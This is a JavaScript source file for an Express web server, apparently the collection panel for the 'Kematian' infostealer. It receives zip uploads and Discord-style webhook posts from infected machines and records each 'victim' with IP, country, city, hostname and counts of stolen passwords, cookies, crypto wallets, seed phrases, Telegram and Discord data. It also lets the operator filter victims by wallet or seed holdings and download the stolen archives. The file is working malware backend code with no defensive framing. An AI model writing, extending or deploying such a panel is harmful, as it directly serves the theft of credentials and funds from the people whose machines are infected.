"use strict";

const express = require("express");
const multer = require("multer");
const path = require("path");
const fs = require("fs");
const crypto = require("crypto");

const { openDb, ensureDir, upsertVictim, insertUpload, listVictims, getVictim, listUploadsForVictim, getUpload, getStats, listCountries } = require("./lib/db");
const { parseZipBuffer } = require("./lib/parser");
const { lookupIp, clientIp } = require("./lib/geo");

const PORT = parseInt(process.env.PORT || "3847", 10);
const API_KEY = process.env.PANEL_API_KEY || process.env.KEMATIAN_PANEL_API_KEY || "";
const DATA_DIR = path.resolve(process.env.PANEL_DATA_DIR || path.join(__dirname, "data"));
const UPLOADS_DIR = path.join(DATA_DIR, "uploads");

ensureDir(DATA_DIR);
ensureDir(UPLOADS_DIR);

const db = openDb(DATA_DIR);
const app = express();

app.use(express.json({ limit: "2mb" }));
app.use(express.static(path.join(__dirname, "public")));

const storage = multer.memoryStorage();
const upload = multer({
  storage,
  limits: { fileSize: 100 * 1024 * 1024 },
});

function requireApiKey(req, res, next) {
  if (!API_KEY) return next();
  const key = req.headers["x-api-key"] || req.headers["authorization"]?.replace(/^Bearer\s+/i, "") || req.query.key;
  if (key !== API_KEY) {
    return res.status(401).json({ error: "invalid api key" });
  }
  next();
}

function saveUploadFile(buffer, filename) {
  const safe = (filename || "upload.zip").replace(/[^a-zA-Z0-9._-]/g, "_");
  const id = crypto.randomBytes(8).toString("hex");
  const stored = `${Date.now()}-${id}-${safe}`;
  const full = path.join(UPLOADS_DIR, stored);
  fs.writeFileSync(full, buffer);
  return { stored, full, size: buffer.length };
}

function ingestBuffer(buffer, meta, req) {
  const ip = clientIp(req);
  const geo = lookupIp(ip);
  const parsed = parseZipBuffer(buffer, meta);

  const victimId = upsertVictim(db, {
    hostname: parsed.hostname,
    os: parsed.os,
    arch: parsed.arch,
    mac_username: parsed.mac_username,
    ip_address: ip,
    country: geo.country,
    country_code: geo.country_code,
    city: geo.city,
    has_wallet: parsed.has_wallet || 0,
    has_seeds: parsed.has_seeds || 0,
    has_telegram: parsed.has_telegram || 0,
    has_discord: parsed.has_discord || 0,
    has_keys: parsed.has_keys || 0,
    has_gaming: parsed.has_gaming || 0,
    has_vpn: parsed.has_vpn || 0,
    password_count: parsed.password_count || 0,
    cookie_count: parsed.cookie_count || 0,
    wallet_count: parsed.wallet_count || 0,
    extension_count: parsed.extension_count || 0,
    seed_count: parsed.seed_count || 0,
    key_count: parsed.key_count || 0,
    telegram_count: parsed.telegram_count || 0,
    candidate_count: parsed.candidate_count || 0,
    gaming_count: parsed.gaming_count || 0,
    vpn_count: parsed.vpn_count || 0,
    stats_json: parsed.stats_json || null,
  });

  const saved = saveUploadFile(buffer, meta.filename || "upload.zip");
  const uploadId = insertUpload(db, {
    victim_id: victimId,
    phase: parsed.phase,
    title: meta.title || null,
    summary: meta.summary || null,
    filename: meta.filename || saved.stored,
    file_path: saved.full,
    file_size: saved.size,
    part_num: parsed.part_num || 1,
    part_total: parsed.part_total || 1,
    ip_address: ip,
    country: geo.country,
    country_code: geo.country_code,
    city: geo.city,
  });

  return { victimId, uploadId, parsed, ip, geo };
}

function parseDiscordPayload(req) {
  let title = "Kematian upload";
  let summary = "";
  const raw = req.body?.payload_json;
  if (raw) {
    try {
      const payload = typeof raw === "string" ? JSON.parse(raw) : raw;
      if (payload.embeds?.[0]) {
        title = payload.embeds[0].title || title;
        summary = payload.embeds[0].description || summary;
      }
      if (payload.content) summary = payload.content;
    } catch {
      /* ignore */
    }
  }
  return { title, summary };
}

function firstUploadedFile(req) {
  if (req.file?.buffer) return req.file;
  const files = req.files;
  if (!files) return null;
  if (Array.isArray(files)) return files[0] || null;
  for (const key of Object.keys(files)) {
    const arr = files[key];
    if (arr?.[0]) return arr[0];
  }
  return null;
}

// Native Kematian ingest (multipart metadata + zip)
app.post("/api/ingest", requireApiKey, upload.single("file"), (req, res) => {
  try {
    if (!req.file?.buffer?.length) {
      return res.status(400).json({ error: "file required" });
    }

    const meta = {
      hostname: req.body.hostname || null,
      os: req.body.os || null,
      arch: req.body.arch || null,
      phase: req.body.phase || null,
      title: req.body.title || null,
      summary: req.body.summary || null,
      filename: req.body.filename || req.file.originalname || "upload.zip",
      part_num: parseInt(req.body.part_num, 10) || undefined,
      part_total: parseInt(req.body.part_total, 10) || undefined,
    };

    const result = ingestBuffer(req.file.buffer, meta, req);
    res.json({ ok: true, ...result });
  } catch (err) {
    console.error("[panel] ingest error:", err);
    res.status(500).json({ error: err.message });
  }
});

// Discord-compatible webhook receiver — point Kematian webhook URL here
app.post("/api/webhook/discord", requireApiKey, upload.any(), (req, res) => {
  try {
    const file = firstUploadedFile(req);
    if (!file?.buffer?.length) {
      return res.status(400).json({ error: "no file in webhook payload" });
    }

    const { title, summary } = parseDiscordPayload(req);
    const meta = {
      title,
      summary,
      filename: file.originalname || "upload.zip",
    };

    ingestBuffer(file.buffer, meta, req);
    res.status(204).end();
  } catch (err) {
    console.error("[panel] discord webhook error:", err);
    res.status(500).json({ error: err.message });
  }
});

app.get("/api/stats", (_req, res) => {
  res.json({
    ...getStats(db),
    countries: listCountries(db),
  });
});

app.get("/api/victims", (req, res) => {
  const rows = listVictims(db, {
    country: req.query.country,
    has_wallet: req.query.has_wallet,
    has_seeds: req.query.has_seeds,
    q: req.query.q,
    sort: req.query.sort,
    limit: req.query.limit,
  });
  res.json({ victims: rows });
});

app.get("/api/victims/:id", (req, res) => {
  const victim = getVictim(db, req.params.id);
  if (!victim) return res.status(404).json({ error: "not found" });
  const uploads = listUploadsForVictim(db, victim.id);
  res.json({ victim, uploads });
});

app.get("/api/uploads/:id/download", (req, res) => {
  const row = getUpload(db, req.params.id);
  if (!row || !fs.existsSync(row.file_path)) {
    return res.status(404).json({ error: "file not found" });
  }
  res.download(row.file_path, row.filename);
});

app.get("*", (_req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

app.listen(PORT, () => {
  console.log(`[kematian-panel] http://127.0.0.1:${PORT}`);
  console.log(`[kematian-panel] data: ${DATA_DIR}`);
  if (API_KEY) {
    console.log("[kematian-panel] API key protection enabled");
  } else {
    console.log("[kematian-panel] warning: no PANEL_API_KEY set — ingest is open");
  }
});